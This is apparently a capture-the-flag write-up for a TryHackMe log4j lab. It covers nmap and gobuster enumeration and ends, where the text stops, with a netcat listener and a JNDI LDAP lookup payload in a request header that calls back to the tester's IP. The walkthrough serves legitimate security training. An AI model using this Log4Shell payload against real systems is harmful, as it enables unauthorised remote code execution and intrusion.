# Lumberjack Turtle Writeup

A Tryhackme box dealing with log4j. https://tryhackme.com/room/lumberjackturtle

## Task 1

This is just a start-up task. Launch the target and wait 7 minutes for all services to come online.

One think I like to do is add an entry in my `/etc/hosts` file for the target.
```bash
echo "{target-ip} target.thm" >> /etc/hosts
# don't forget to use two > so you append the hosts file, not overwrite it
```

## Task 2

As usual, start an nmap scan to see what ports are open.
```bash
nmap -sV -p- target.thm
```

This will reveal the target is listening on the standard ports: 22 and 80.

Browsing the website on port 80 doesn't reveal anything interesting.

Run a dirbuster or gobuster scan to see if you can enumerate any pages on the site.
```bash
gobuster dir -u target.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

This reveals a `/~logs` path. The web page doesn't have anything but tells us to look deeper.
```bash
gobuster dir -u target.thm/~logs -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

Now we see a /~logs/log4j page. It's contents are "Hello, vulnerable world! What could we do HERE?"

For sending simple web requests I prefer [Httpie](https://httpie.io/).

With the log4j hits on the web site, let's start a listener and try adding a jndi ldap lookup to a common header.
```
nc -lvnp 9999
# new tab
http GET target.thm/~logs/log4j 'Accept:${jndi:ldap://10.10.238.114:9999}'
